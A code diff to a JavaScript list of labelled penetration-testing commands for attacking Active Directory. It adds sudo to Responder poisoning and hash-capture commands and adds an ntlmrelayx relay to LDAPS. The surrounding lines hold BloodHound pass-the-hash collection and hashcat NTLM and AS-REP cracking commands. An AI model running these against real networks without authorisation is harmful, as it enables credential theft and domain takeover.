@@ -15400,8 +15400,9 @@ const OP_AC = [
   ['bloodhound-python -d <domain> -u <user> -p <pass> -dc <dc> -c DCOnly --zip',    'bloodhound — DC only'],
   ['bloodhound-python -d <domain> -u <user> -H <hash> -dc <dc> -c All --zip',       'bloodhound — PTH'],
   // ── Responder / MITM ───────────────────────────────────────────────────
-  ['responder -I <iface> -A',                      'responder — passive (analyze)'],
-  ['responder -I <iface> -wrf',                    'responder — capture hashes'],
+  ['sudo responder -I <iface> -A',                 'responder — passive (analyze)'],
+  ['sudo responder -I <iface> -wrf',               'responder — capture hashes'],
+  ['sudo impacket-ntlmrelayx -t ldaps://<dc> -smb2support --no-da', 'ntlmrelayx — relay to LDAP (needs NOPASSWD)'],
   // ── Hashcat ────────────────────────────────────────────────────────────
   ['hashcat -m 1000 <hash_file> <wordlist>',       'hashcat — NTLM'],
   ['hashcat -m 18200 <hash_file> <wordlist>',      'hashcat — AS-REP (krb5asrep)'],
